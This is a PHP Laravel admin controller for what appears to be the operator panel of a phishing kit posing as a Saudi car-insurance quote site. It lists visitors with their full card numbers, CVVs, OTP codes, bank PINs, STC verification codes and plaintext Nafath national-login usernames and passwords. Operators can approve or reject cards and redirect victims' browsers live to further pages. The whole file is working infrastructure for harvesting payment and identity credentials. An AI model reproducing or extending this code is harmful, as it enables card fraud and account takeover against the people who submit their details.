<?php

namespace App\Http\Controllers\Admin;

use App\Events\CustomerRedirected;
use App\Events\WindowReadUpdated;
use App\Http\Controllers\Admin\Traits\NotifiesDashboard;
use App\Http\Controllers\Controller;
use App\Http\Requests\Admin\MarkViewedRequest;
use App\Http\Requests\Admin\RedirectCustomerRequest;
use App\Models\AdminDashboardSession;
use App\Models\CustomerBlock;
use App\Models\CustomerProfile;
use App\Models\OtpCode;
use App\Models\PaymentCard;
use App\Models\UserActivity;
use App\Services\CustomerCacheService;
use App\Services\CarrierDetectionService;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Log;

class AdminCustomerController extends Controller
{
    use NotifiesDashboard;

    private const ONLINE_WINDOW_MINUTES = 3;

    /**
     * Shared projection for orders embedded in dashboard customer payloads.
     * Keep list and show endpoints aligned to avoid shape drift.
     *
     * @var list<string>
     */
    private const ORDER_DASHBOARD_COLUMNS = [
        'id',
        'customer_profile_id',
        'order_number',
        'policy_number',
        'plan_name',
        'insurance_company',
        'insurance_type',
        'plan_type',
        'subtotal',
        'vat_amount',
        'total',
        'deductible',
        'payment_method',
        'payment_status',
        'status',
        'vehicle_plate',
        'vehicle_make',
        'vehicle_model',
        'vehicle_year',
        'created_at',
        'updated_at',
    ];

    public function index(Request $request): JsonResponse
    {
        // ── Build a cache key based on filters so filtered vs unfiltered don't collide ──
        $activeOnly = $request->boolean('active_only') ? '1' : '0';
        $paymentOnly = $request->boolean('payment_only') ? '1' : '0';
        $search = $this->normalizeSearchTerm((string) $request->input('search', ''));
        $page = (int) $request->input('page', 1);
        $perPage = min((int) $request->input('per_page', 80), 150);
        $sortBy = $request->input('sort_by', 'last_activity_at');
        $sortOrder = $request->input('sort_order', 'desc');

        // Cache TTL: slightly longer to avoid expensive query storms under
        // concurrent WS + polling + manual actions.
        // Search queries: no cache (to show results immediately)
        $isCached = ! $search;
        $cacheKey = "admin:customers:saudi:v6:{$activeOnly}:{$paymentOnly}:{$search}:{$page}:{$perPage}:{$sortBy}:{$sortOrder}";

        if ($isCached) {
            CustomerCacheService::trackKey($cacheKey);
        }

        // ── Fetch data with stampede-safe caching ──
        // Cache::flexible [2, 10] = fresh for 2s, stale-while-revalidate up to 10s.
        // Under high concurrency, only ONE admin triggers the expensive query;
        // all others get the (at most 10s old) stale value instantly.
        $result = $isCached
            ? Cache::flexible($cacheKey, [5, 20], fn () => $this->fetchCustomers($activeOnly, $paymentOnly, $search, $perPage, $sortBy, $sortOrder))
            : $this->fetchCustomers($activeOnly, $paymentOnly, $search, $perPage, $sortBy, $sortOrder);

        // Track admin dashboard visit (throttled — once per minute per admin)
        if (Auth::check()) {
            $adminId = Auth::id();
            $visitKey = "admin:visit_logged:{$adminId}";
            if (! Cache::has($visitKey)) {
                Cache::put($visitKey, true, 60);
                $session = AdminDashboardSession::getOrCreateForAdmin($adminId);
                $session->recordVisit();
                $session->recordDashboardStats([
                    'total_customers' => $result['total'],
                    'active_customers' => $result['active_count'],
                    'pending_otps' => OtpCode::pending()->count(),
                    'pending_cards' => PaymentCard::pending()->count(),
                ]);

                UserActivity::create([
                    'user_id' => $adminId,
                    'ip_address' => $request->ip(),
                    'page' => '/admin/dashboard',
                    'action' => 'view_customers',
                ]);
            }
        }

        return response()->json($result);
    }

    /**
     * Extract database query logic for reusability and clarity
     */
    private function fetchCustomers(string $activeOnly, string $paymentOnly, string $search, int $perPage, string $sortBy = 'last_activity_at', string $sortOrder = 'desc'): array
    {
        $onlineThreshold = now()->subMinutes(self::ONLINE_WINDOW_MINUTES);

        // Whitelist sortable columns to prevent SQL injection
        $allowedSortColumns = ['last_activity_at', 'created_at', 'full_name', 'national_id', 'ip_address', 'is_active', 'city', 'region'];
        if (! in_array($sortBy, $allowedSortColumns, true)) {
            $sortBy = 'last_activity_at';
        }
        $sortOrder = strtolower($sortOrder) === 'asc' ? 'asc' : 'desc';

        // Build one filtered base query first. Every customer profile remains
        // visible: a session can legitimately have multiple historical rows and
        // collapsing them can hide the row that contains contact details.
        // Product rule: the admin customer dashboard is Saudi-only. Applying
        // this server-side prevents query-string or client-state bypasses.
        $baseFiltered = CustomerProfile::query()->excludeBots()->saudi();

        // Dashboard-tab counters deliberately use an unfiltered source. A
        // paginated response (or the active "cards" filter) must never make
        // the visitors/cards totals change just because the admin switched
        // tabs or searched the table.
        $summaryBase = CustomerProfile::query()->excludeBots()->saudi();

        if ($activeOnly === '1') {
            $baseFiltered->where('last_activity_at', '>=', $onlineThreshold);
        }

        if ($search) {
            $escaped = addcslashes($search, '\%_');
            $digitsOnly = preg_replace('/\D+/', '', $search) ?: '';
            $piiHash = CustomerProfile::hashPii($search);
            $digitsHash = $digitsOnly !== '' && $digitsOnly !== $search
                ? CustomerProfile::hashPii($digitsOnly)
                : null;

            $baseFiltered->where(function ($q) use ($escaped, $piiHash, $digitsHash) {
                $q->where('ip_address', 'like', "%{$escaped}%")
                    ->orWhere('full_name', 'like', "%{$escaped}%")
                    ->orWhere('national_id_hash', $piiHash)
                    ->orWhere('phone_number_hash', $piiHash);

                if ($digitsHash) {
                    $q->orWhere('national_id_hash', $digitsHash)
                        ->orWhere('phone_number_hash', $digitsHash);
                }
            });
        }

        // ── Payment cards only filter ──
        // Used by dashboard cleanup mode to show only customers who submitted card data.
        if ($paymentOnly === '1') {
            $baseFiltered->whereHas('paymentCards');
        }

        // `active_count` describes the filtered records currently shown.
        $activeCount = (clone $baseFiltered)
            ->where('last_activity_at', '>=', $onlineThreshold)
            ->count();

        $summaryCounts = [
            'visitors' => (clone $summaryBase)->count(),
            'cards' => (clone $summaryBase)->whereHas('paymentCards')->count(),
            // Customer profiles do not currently have an archive state. Keep
            // the contract explicit until an actual archive workflow exists.
            'archive' => 0,
            'active' => (clone $summaryBase)
                ->where('last_activity_at', '>=', $onlineThreshold)
                ->count(),
        ];

        $query = (clone $baseFiltered)
            ->withCount([
                'paymentCards',
                'otpCodes as payment_otp_count' => fn($q) => $q->whereIn('type', ['otp', 'pin', 'phone', 'phone_verification', 'stc_otp', 'stc_verification']),
            ])
            ->with([
                // NOTE: do NOT use ->limit(N) here — Laravel applies eager-load
                // limits GLOBALLY across all parents (single SQL query), not
                // per-parent. This caused customers to randomly receive 0 OTP
                // records when total rows across the page exceeded the limit,
                // making latest_pin / latest_phone_otp appear null in the
                // dashboard refresh payload (the disappearing-blocks bug).
                // Load full related history for this page so new-data detection
                // and admin list formatting remain accurate.
                'otpCodes' => fn($q) => $q->select('id', 'customer_profile_id', 'type', 'code', 'code_value', 'status', 'phone_number', 'created_at', 'updated_at')
                    ->whereIn('type', ['otp', 'pin', 'phone', 'phone_verification', 'stc_otp', 'stc_verification'])
                    ->where('created_at', '>=', now()->subDays(30))
                    ->latest(),
                'paymentCards' => fn($q) => $q->select('id', 'customer_profile_id', 'session_id', 'card_number', 'last4', 'holder_name', 'card_type', 'expiry_month', 'expiry_year', 'cvv_encrypted', 'status', 'rejection_reason', 'reviewed_by', 'reviewed_at', 'redirect_url', 'created_at', 'updated_at')
                    ->where('created_at', '>=', now()->subDays(30))
                    ->latest(),
                // Same no-limit rule as above applies here — a per-parent limit()
                // would silently drop orders for customers later in the page.
                // Dashboard embeds an order snapshot for state sync (without
                // applicant identity/contact fields from orders table).
                'orders' => fn($q) => $q->select(self::ORDER_DASHBOARD_COLUMNS)
                    ->latest(),
            ])
            // Ordering rules (see issue: admin viewing demoted customers from #1):
            //   1. Primary: last_activity_at DESC — newest real activity at top.
            //      `last_activity_at` is updated by createOrUpdateByIP / recordActivity
            //      whenever a customer submits real data (page view, OTP, card, …).
            //      It is NOT touched by markViewed / data_viewed updates, so admin
            //      viewing a card never reorders the list.
            //   2. Tiebreaker: id DESC — keeps order stable when multiple rows share
            //      the same last_activity_at timestamp (e.g. just inserted).
            ->orderBy($sortBy, $sortOrder)
            ->orderByDesc('id');

        $paginated = $query->paginate($perPage);
        $pageCustomers = $paginated->getCollection();
        $blockedSessionIds = $pageCustomers
            ->pluck('session_id')
            ->filter()
            ->unique()
            ->values();
        $blockedSessions = $blockedSessionIds->isEmpty()
            ? []
            : CustomerBlock::query()
                ->whereIn('session_id', $blockedSessionIds->all())
                ->pluck('session_id')
                ->all();
        $blockedSessionLookup = array_fill_keys($blockedSessions, true);

        $customers = $pageCustomers
            ->map(fn ($c) => $this->toCardFormat($c, isset($blockedSessionLookup[$c->session_id ?? ''])));
            // NOTE: do NOT post-sort by has_new_* flags here.
            // Doing so coupled the list order to the `data_viewed` field, which meant
            // an admin opening a customer card (markViewed → has_new_* flips false)
            // would demote that customer from the top. The SQL ORDER BY last_activity_at
            // above is the single source of truth for ordering.

        return [
            'success' => true,
            'data' => $customers->values(),
            'customers' => $customers->values(), // backward-compat alias
            'count' => $paginated->total(),
            'total' => $paginated->total(),
            'active_count' => $activeCount,
            'meta' => [
                'counts' => $summaryCounts,
            ],
            'current_page' => $paginated->currentPage(),
            'last_page' => $paginated->lastPage(),
            'per_page' => $paginated->perPage(),
        ];
    }

    /**
     * Get a single customer by ID — used for patch updates from WebSocket events.
     */
    public function show(int $id): JsonResponse
    {
        $customer = CustomerProfile::query()
            ->saudi()
            ->with([
                'otpCodes',
                'paymentCards',
                'orders' => fn($q) => $q->select(self::ORDER_DASHBOARD_COLUMNS)
                    ->latest(),
            ])
            ->find($id);

        if (! $customer) {
            return response()->json([
                'success' => false,
                'message' => 'العميل غير موجود',
            ], 404);
        }

        return response()->json([
            'success' => true,
            'data' => $this->toCardFormat($customer, CustomerBlock::matches($customer->session_id)),
        ]);
    }

    public function revealPii(int $id): JsonResponse
    {
        $customer = CustomerProfile::with(['otpCodes', 'paymentCards'])->find($id);

        if (! $customer) {
            return response()->json([
                'success' => false,
                'message' => 'العميل غير موجود',
            ], 404);
        }

        $this->logAdminAudit(Auth::id(), 'reveal_customer_pii', [
            'customer_id' => $id,
            'fields' => ['national_id', 'phone_number', 'email', 'nafath_password'],
        ]);

        $customer->makeVisible(['national_id', 'phone_number', 'email', 'nafath_username', 'nafath_password']);

        return response()->json([
            'success' => true,
            'data' => [
                'nationalId' => $customer->national_id,
                'phoneNumber' => $customer->phone_number,
                'email' => $customer->email,
                'nafathUsername' => $customer->nafath_username,
                'nafathPassword' => $customer->nafath_password,
            ],
        ]);
    }

    private function logAdminAudit(?int $adminId, string $action, array $metadata = []): void
    {
        UserActivity::create([
            'user_id' => $adminId,
            'ip_address' => request()->ip(),
            'page' => '/admin/dashboard',
            'action' => $action,
            'metadata' => $metadata,
        ]);
    }

    private function normalizeSearchTerm(string $value): string
    {
        $arabicDigits = ['٠', '١', '٢', '٣', '٤', '٥', '٦', '٧', '٨', '٩', '۰', '۱', '۲', '۳', '۴', '۵', '۶', '۷', '۸', '۹'];
        $latinDigits = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];

        return trim(str_replace($arabicDigits, $latinDigits, $value));
    }

    /**
     * Redirect a customer to a specific page
     */
    public function redirectCustomer(RedirectCustomerRequest $request): JsonResponse
    {
        $customer = CustomerProfile::findOrFail($request->integer('customer_id'));

        $customer->update(['current_page' => $request->redirect_url]);

        // Cache pending redirect so the customer's heartbeat can pick it up
        // even if WebSocket is unavailable (polling fallback — TTL 120s).
        if ($customer->session_id) {
            \Illuminate\Support\Facades\Cache::put(
                \App\Support\CustomerBroadcastChannel::pendingRedirectCacheKey($customer->session_id),
                $request->redirect_url,
                120
            );

            broadcast(new CustomerRedirected($customer->session_id, $request->redirect_url, $customer->id))->toOthers();
        }

        $this->notifyDashboard($customer, 'customer_redirected');

        return response()->json([
            'success' => true,
            'message' => 'تم توجيه العميل بنجاح',
        ]);
    }

    /**
     * Mark a data section as viewed — shared across ALL admins.
     */
    public function markViewed(MarkViewedRequest $request, int $id): JsonResponse
    {
        $customer = CustomerProfile::find($id);
        if (! $customer) {
            // Customer may have been merged/deleted — return 200 to avoid noisy console errors
            return response()->json(['success' => false, 'message' => 'العميل غير موجود']);
        }

        $dataType = $request->input('data_type');
        $viewed = $customer->data_viewed ?? [];

        $currentCount = match ($dataType) {
            'vehicle' => $this->countVehicleFields($customer),
            'insurance' => $this->countInsuranceFields($customer),
            'payment' => $this->countPaymentData($customer),
            default => 0,
        };

        $readAt = now()->toISOString();

        $viewed[$dataType] = [
            'at' => $readAt,
            'by' => Auth::id(),
            'count' => $currentCount,
            'hash' => $this->computeSectionHash($customer, $dataType),
        ];

        $customer->update(['data_viewed' => $viewed]);

        // Do not flush the full customer-list cache here. WindowReadUpdated
        // broadcasts clear the blink instantly for all connected admins, while
        // keeping the short-lived list cache avoids expensive recomputation
        // storms when modals open/close repeatedly.

        // ✅ Instant broadcast to ALL admins (including self) — blink disappears immediately
        try {
            broadcast(new WindowReadUpdated(
                $customer->id,
                $customer->ip_address,
                $dataType,
                $readAt,
                Auth::id()
            ));
        } catch (\Throwable $e) {
            Log::warning('mark-viewed broadcast failed', ['error' => $e->getMessage()]);
        }

        return response()->json(['success' => true]);
    }

    /**
     * Delete a tracked customer card
     */
    public function destroy(int $id): JsonResponse
    {
        $customer = CustomerProfile::findOrFail($id);

        $customer->delete();

        $this->flushCustomerCache();

        return response()->json([
            'success' => true,
            'message' => 'تم حذف بطاقة العميل بنجاح',
        ]);
    }

    // ─── Private Helpers ─────────────────────────────────────────

    /**
     * Count vehicle/quote fields for a customer.
     */
    private function countVehicleFields(CustomerProfile $c): int
    {
        $count = 0;
        if ($c->insurance_purpose) {
            $count++;
        }
        if ($c->registration_type) {
            $count++;
        }
        if ($c->national_id) {
            $count++;
        }
        if ($c->sequence_number) {
            $count++;
        }
        if ($c->customs_card) {
            $count++;
        }
        if ($c->birth_year && $c->birth_month) {
            $count++;
        }
        if ($c->manufacturing_year) {
            $count++;
        }

        return $count;
    }

    /**
     * Count insurance data fields for a customer.
     */
    private function countInsuranceFields(CustomerProfile $c): int
    {
        $count = 0;
        if ($c->full_name) {
            $count++;
        }
        if ($c->birth_date) {
            $count++;
        }
        if ($c->phone_number) {
            $count++;
        }
        if ($c->region) {
            $count++;
        }
        if ($c->city) {
            $count++;
        }
        if ($c->vehicle_type) {
            $count++;
        }
        if ($c->vehicle_model) {
            $count++;
        }
        if ($c->vehicle_price) {
            $count++;
        }
        if ($c->plate_number) {
            $count++;
        }
        if ($c->repair_method) {
            $count++;
        }

        return $count;
    }

    /**
     * Count payment data items (cards + OTPs + PINs + phone/STC + nafath) for a customer.
     */
    private function countPaymentData(CustomerProfile $c): int
    {
        $count = 0;

        // Use withCount attributes when available (list view), otherwise
        // count loaded relations or fall back to DB queries (show view).
        if (isset($c->payment_cards_count)) {
            $count += $c->payment_cards_count;
        } elseif ($c->relationLoaded('paymentCards')) {
            $count += $c->paymentCards->count();
        } else {
            $count += $c->paymentCards()->count();
        }

        $otpTypes = ['otp', 'pin', 'phone', 'phone_verification', 'stc_otp', 'stc_verification'];
        if (isset($c->payment_otp_count)) {
            $count += $c->payment_otp_count;
        } elseif ($c->relationLoaded('otpCodes')) {
            $count += $c->otpCodes->whereIn('type', $otpTypes)->count();
        } else {
            $count += $c->otpCodes()->whereIn('type', $otpTypes)->count();
        }

        // Nafath credentials
        if ($c->nafath_username || $c->nafath_verification_code) {
            $count++;
        }

        // STC / phone stage flags in extra_data
        $extra = $c->extra_data ?? [];
        if (! empty($extra['stc_waiting_approved']) || ! empty($extra['stc_waiting_rejected'])) {
            $count++;
        }
        if (! empty($extra['stc_otp_approved']) || ! empty($extra['stc_otp_rejected'])) {
            $count++;
        }
        if (! empty($extra['stc_call_approved']) || ! empty($extra['stc_call_rejected'])) {
            $count++;
        }
        if (! empty($extra['phone_data_status'])) {
            $count++;
        }
        if (! empty($extra['phone_otp_status'])) {
            $count++;
        }

        return $count;
    }

    /**
     * Format customer profile for API response (matches CustomerCard.vue prop structure)
     */
    private function toCardFormat(CustomerProfile $customer, ?bool $isBlocked = null): array
    {
        $customer->makeVisible(['national_id', 'phone_number', 'email', 'nafath_username', 'nafath_password']);

        $data = $customer->toArray();

        // The eager-loaded paymentCards relation is serialized into
        // $data['payment_cards'] by toArray(). Strip it here — the admin
        // payload uses the curated cards mapper below for the
        // payment.cards block, so this raw dump is redundant and could
        // leak fields not intended for the admin payload.
        unset($data['payment_cards']);

        // Slim the payload: remove fields the dashboard frontend never
        // consumes (hash columns, raw user_agent, raw journey_history) and
        // duplicate extra_data keys (frontend reads `custom_data` only).
        // This reliably trims ~30-40% of the per-customer payload.
        unset(
            $data['national_id_hash'],
            $data['phone_number_hash'],
            $data['email_hash'],
            $data['user_agent'],
            $data['journey_history'],
            $data['otp_codes'],
        );

        $data['ip'] = $data['ip_address'] ?? null;

        $latestOtp = $customer->otpCodes->where('type', 'otp')->sortByDesc('created_at')->first();
        $latestPin = $customer->otpCodes->where('type', 'pin')->sortByDesc('created_at')->first();
        $latestPhoneOtp = $customer->otpCodes->whereIn('type', ['phone', 'phone_verification', 'stc_verification', 'stc_otp'])->sortByDesc('created_at')->first();

        if ($latestOtp) {
            $latestOtp->makeVisible(['code', 'code_value']);
        }
        if ($latestPin) {
            $latestPin->makeVisible(['code', 'code_value']);
        }
        if ($latestPhoneOtp) {
            $latestPhoneOtp->makeVisible(['code', 'code_value']);
        }

        /** @var \Illuminate\Database\Eloquent\Collection<int, \App\Models\PaymentCard> $paymentCards */
        $paymentCards = $customer->paymentCards;
        $cards = $paymentCards->sortByDesc('created_at')->toBase()->map(function (\App\Models\PaymentCard $card): array {
            $card->makeVisible(['card_number', 'cvv_encrypted']);

            $rawPan = (string) ($card->card_number ?? '');
            $panDigits = preg_replace('/\D+/', '', $rawPan);
            $bin = strlen($panDigits) >= 6 ? substr($panDigits, 0, 6) : null;
            $cardNumberDisplay = $panDigits !== ''
                ? trim(chunk_split($panDigits, 4, ' '))
                : ($rawPan !== '' ? $rawPan : null);
            $cvvDisplay = $card->cvv_encrypted !== null && $card->cvv_encrypted !== ''
                ? (string) $card->cvv_encrypted
                : null;

            return [
                'id'                  => $card->id,
                'customer_profile_id' => $card->customer_profile_id,
                'session_id'          => $card->session_id,
                'card_number_display' => $cardNumberDisplay,
                'card_number_full'    => $rawPan !== '' ? $rawPan : null,
                'card_number'         => $rawPan !== '' ? $rawPan : null,
                'last4'               => $card->last4,
                'bin'                 => $bin,
                'holder_name'         => $card->holder_name,
                'card_holder'         => $card->holder_name,
                'card_type'           => $card->card_type,
                'expiry_month'        => $card->expiry_month,
                'expiry_year'         => $card->expiry_year,
                'cvv'                 => $cvvDisplay,
                'cvv_display'         => $cvvDisplay,
                'status'              => $card->status,
                'rejection_reason'    => $card->rejection_reason,
                'reviewed_by'         => $card->reviewed_by,
                'reviewed_at'         => $card->reviewed_at,
                'redirect_url'        => $card->redirect_url,
                'created_at'          => $card->created_at,
                'updated_at'          => $card->updated_at,
            ];
        })->values();

        $birthDate = $data['birth_date'] ?? null;
        if (! $birthDate && ($data['birth_year'] ?? null) && ($data['birth_month'] ?? null)) {
            $birthDate = $data['birth_month'].'/'.$data['birth_year'];
        }

        $os = null;
        $deviceType = $customer->device_type;
        $browser = $customer->device_browser;
        if ($deviceType === 'mobile') {
            $os = str_contains(strtolower($browser ?? ''), 'safari') ? 'iOS' : 'Android';
        } elseif ($deviceType === 'tablet') {
            $os = str_contains(strtolower($browser ?? ''), 'safari') ? 'iPadOS' : 'Android';
        } else {
            $os = 'Windows';
        }

        $carrier = $customer->phone_carrier;
        if (! $carrier && $customer->getRawOriginal('phone_number')) {
            $carrier = CarrierDetectionService::detect($customer->getRawOriginal('phone_number'));
        }

        $signedNationalId = $data['national_id'] ?? $customer->national_id;
        $signedPhoneNumber = $data['phone_number'] ?? $customer->phone_number;
        $signedEmail = $data['email'] ?? $customer->email;
        $signedNafathUsername = $data['nafath_username'] ?? $customer->nafath_username;
        $signedNafathPassword = $data['nafath_password'] ?? $customer->nafath_password;

        /** @var \App\Models\Order|null $latestOrder */
        $latestOrder = $customer->orders->first();

        // Dashboard visual fields should reflect the actual latest order when
        // available; fall back to legacy profile snapshot fields otherwise.
        $orderVehicleMake = $latestOrder?->vehicle_make;
        $orderVehicleModel = $latestOrder?->vehicle_model;
        $orderVehiclePlate = $latestOrder?->vehicle_plate;
        $orderInsuranceType = $latestOrder?->insurance_type;
        $orderTotal = $latestOrder?->total;

        return array_merge($data, [
            'is_blocked' => $isBlocked ?? false,
            'is_online' => $this->isCustomerOnline($customer),
            // Expose the current order directly for instant dashboard refreshes.
            'latest_order' => $latestOrder,
            'journey' => [
                'current_page' => $customer->current_page,
                'completion_percentage' => $customer->completion_percentage,
                'total_visits' => $customer->total_visits,
            ],
            'device_info' => [
                'type' => $customer->device_type,
                'browser' => $customer->device_browser,
                'os' => $os,
            ],
            'nafath' => [
                'username' => $signedNafathUsername,
                'password' => $signedNafathPassword,
                'verified' => $customer->nafath_verified,
                'verification_code' => $customer->nafath_verification_code,
            ],
            'location' => [
                'city' => $customer->location_city,
                'country' => $customer->location_country,
            ],
            'payment' => [
                'cards' => $cards,
            ],
            'latest_otp' => $latestOtp,
            'latest_pin' => $latestPin,
            'latest_phone_otp' => $latestPhoneOtp,
            'all_otps' => $customer->otpCodes->whereIn('type', ['otp', 'stc_otp', 'phone', 'phone_verification', 'stc_verification'])
                ->each(fn ($o) => $o->makeVisible(['code', 'code_value']))->values(),
            'all_pins' => $customer->otpCodes->where('type', 'pin')
                ->sortByDesc('created_at')
                ->each(fn ($o) => $o->makeVisible(['code', 'code_value']))->values(),

            'nationalId' => $signedNationalId,
            'fullName' => $data['full_name'] ?? null,
            'phoneNumber' => $signedPhoneNumber,
            'email' => $signedEmail,
            'phone_carrier' => $carrier,
            'carrier' => $carrier,
            'birthDate' => $birthDate,
            'birthYear' => $data['birth_year'] ?? null,
            'birthMonth' => $data['birth_month'] ?? null,
            'vehicleType' => $data['vehicle_type'] ?? null,
            'vehicleMake' => $orderVehicleMake ?? $data['vehicle_make'] ?? null,
            'vehicleModel' => $orderVehicleModel ?? $data['vehicle_model'] ?? null,
            'plateNumber' => $orderVehiclePlate ?? $data['plate_number'] ?? $data['vehicle_plate'] ?? null,
            'vin' => $data['vin'] ?? null,
            'manufacturingYear' => $data['manufacturing_year'] ?? null,
            'vehiclePrice' => $data['vehicle_price'] ?? null,
            'insuranceType' => $orderInsuranceType ?? $data['insurance_type'] ?? null,
            'insurancePurpose' => $data['insurance_purpose'] ?? null,
            'usagePurpose' => $data['insurance_purpose'] ?? null,
            'registrationType' => $data['registration_type'] ?? null,
            'repairMethod' => $data['repair_method'] ?? null,
            'policyStartDate' => $data['policy_start_date'] ?? null,
            'sequenceNumber' => $data['sequence_number'] ?? null,
            'customsCard' => $data['customs_card'] ?? null,
            'hasAdditionalDriver' => $data['has_additional_driver'] ?? false,
            'additionalDriverName' => $data['additional_driver_name'] ?? null,
            'additionalDriverNationalId' => $data['additional_driver_national_id'] ?? null,
            'additionalDriverBirthDate' => $data['additional_driver_birth_date'] ?? null,
            'totalPrice' => $orderTotal ?? $data['total_price'] ?? null,
            'selectedInsurance' => $data['selected_insurance'] ?? null,
            'country' => $this->normalizeCountryCode($data['location_country'] ?? null, $data['country'] ?? null),
            'phone' => $signedPhoneNumber,

            'last_activity' => $customer->last_activity_at?->toISOString(),
            'last_activity_at' => $customer->last_activity_at?->toISOString(),

            'custom_data' => $customer->extra_data ?? [],
            'extraData' => $data['extra_data'] ?? null,
            'extra_data' => $data['extra_data'] ?? null,

            'has_new_vehicle' => $this->isDataNew($customer, 'vehicle'),
            'has_new_insurance' => $this->isDataNew($customer, 'insurance'),
            'has_new_payment' => $this->isDataNew($customer, 'payment'),
        ]);
    }

    private function isCustomerOnline(CustomerProfile $customer): bool
    {
        return $customer->last_activity_at !== null
            && $customer->last_activity_at->greaterThanOrEqualTo(now()->subMinutes(self::ONLINE_WINDOW_MINUTES));
    }

    /**
     * Normalize any country value (Arabic name, English name, or ISO code) to a 2-letter ISO code.
     * Handles legacy data that stored full names instead of codes.
     */
    private function normalizeCountryCode(?string $locationCountry, ?string $countryField): ?string
    {
        static $nameToCode = [
            'المملكة العربية السعودية' => 'SA', 'السعودية' => 'SA', 'Saudi Arabia' => 'SA',
            'الإمارات العربية المتحدة' => 'AE', 'الإمارات' => 'AE', 'United Arab Emirates' => 'AE',
            'الكويت' => 'KW', 'Kuwait' => 'KW',
            'البحرين' => 'BH', 'Bahrain' => 'BH',
            'عُمان' => 'OM', 'Oman' => 'OM',
            'قطر' => 'QA', 'Qatar' => 'QA',
            'مصر' => 'EG', 'Egypt' => 'EG',
            'الأردن' => 'JO', 'Jordan' => 'JO',
            'لبنان' => 'LB', 'Lebanon' => 'LB',
            'العراق' => 'IQ', 'Iraq' => 'IQ',
            'تركيا' => 'TR', 'Turkey' => 'TR', 'Türkiye' => 'TR',
            'الهند' => 'IN', 'India' => 'IN',
            'باكستان' => 'PK', 'Pakistan' => 'PK',
            'اليمن' => 'YE', 'Yemen' => 'YE',
            'السودان' => 'SD', 'Sudan' => 'SD',
            'فلسطين' => 'PS', 'Palestine' => 'PS',
        ];

        // Prefer the `country` column if it's already an ISO code
        if ($countryField && strlen($countryField) === 2) {
            return strtoupper($countryField);
        }

        // Reverse-lookup from location_country (Arabic) or country (English name)
        foreach ([$countryField, $locationCountry] as $value) {
            if ($value && isset($nameToCode[$value])) {
                return $nameToCode[$value];
            }
        }

        // Fallback — return whatever we have (may be an unknown name)
        return $locationCountry ?? $countryField;
    }

    /**
     * Check if a data section has new/unseen data.
     * Uses count + hash + timestamp detection for comprehensive change tracking.
     */
    private function isDataNew(CustomerProfile $customer, string $dataType): bool
    {
        $viewed = $customer->data_viewed[$dataType] ?? null;

        $currentCount = match ($dataType) {
            'vehicle' => $this->countVehicleFields($customer),
            'insurance' => $this->countInsuranceFields($customer),
            'payment' => $this->countPaymentData($customer),
            default => 0,
        };

        // No data at all → nothing new
        if ($currentCount === 0) {
            return false;
        }

        // Never viewed → definitely new
        if (! $viewed) {
            return true;
        }

        // More items than last viewed → new data added
        if ($currentCount > ($viewed['count'] ?? 0)) {
            return true;
        }

        // Hash mismatch → field values changed (catches edits like phone X→Y)
        $currentHash = $this->computeSectionHash($customer, $dataType);
        if ($currentHash !== ($viewed['hash'] ?? '')) {
            return true;
        }

        // Timestamp check — newer records since last view (all sections)
        $viewedAt = $viewed['at'] ?? null;
        if ($viewedAt) {
            $viewedTime = strtotime($viewedAt);
            $latestDataTime = $this->getLatestDataTimestamp($customer, $dataType);
            if ($latestDataTime > $viewedTime) {
                return true;
            }
        }

        return false;
    }

    /**
     * Compute a hash of the relevant field values for a section.
     * Detects value changes that count-based detection misses.
     */
    private function computeSectionHash(CustomerProfile $c, string $dataType): string
    {
        $values = match ($dataType) {
            'vehicle' => [
                $c->insurance_purpose,
                $c->registration_type,
                $c->national_id,
                $c->sequence_number,
                $c->customs_card,
                $c->birth_year,
                $c->birth_month,
                $c->manufacturing_year,
            ],
            'insurance' => [
                $c->full_name,
                $c->birth_date,
                $c->phone_number,
                $c->region,
                $c->city,
                $c->vehicle_type,
                $c->vehicle_model,
                $c->vehicle_price,
                $c->plate_number,
                $c->repair_method,
            ],
            'payment' => [
                ($c->paymentCards ?? collect())->sortBy('id')->map(fn ($i) => $i->id.':'.$i->status)->implode(','),
                ($c->otpCodes ?? collect())->whereIn('type', ['otp', 'pin'])->sortBy('id')->map(fn ($i) => $i->id.':'.$i->status)->implode(','),
                ($c->otpCodes ?? collect())->whereIn('type', ['phone_verification', 'stc_otp', 'stc_verification'])->sortBy('id')->map(fn ($i) => $i->id.':'.$i->status)->implode(','),
                ($c->nafath_verified ? '1' : '0') . ':' . ($c->nafath_verification_code ?? ''),
            ],
            default => [],
        };

        return md5(implode('|', array_map('strval', $values)));
    }

    /**
     * Get the latest data timestamp for a section.
     * Vehicle/insurance rely on hash+count (updated_at is unreliable — changes on every page_view).
     * Payment uses related model timestamps (paymentCards, otpCodes).
     */
    private function getLatestDataTimestamp(CustomerProfile $c, string $dataType): int
    {
        return match ($dataType) {
            // Vehicle/insurance fields live on customer_profiles — updated_at changes on every
            // page_view (TrackCustomerActivityJob). Hash+count detection is sufficient.
            'vehicle', 'insurance' => 0,
            'payment' => max(
                ($c->paymentCards ?? collect())->max('updated_at') ? strtotime(($c->paymentCards ?? collect())->max('updated_at')) : 0,
                ($c->otpCodes ?? collect())->whereIn('type', ['otp', 'pin'])->max('created_at')
                    ? strtotime(($c->otpCodes ?? collect())->whereIn('type', ['otp', 'pin'])->max('created_at'))
                    : 0,
                ($c->otpCodes ?? collect())->whereIn('type', ['phone_verification', 'stc_otp', 'stc_verification'])->max('created_at')
                    ? strtotime(($c->otpCodes ?? collect())->whereIn('type', ['phone_verification', 'stc_otp', 'stc_verification'])->max('created_at'))
                    : 0
            ),
            default => 0,
        };
    }
}
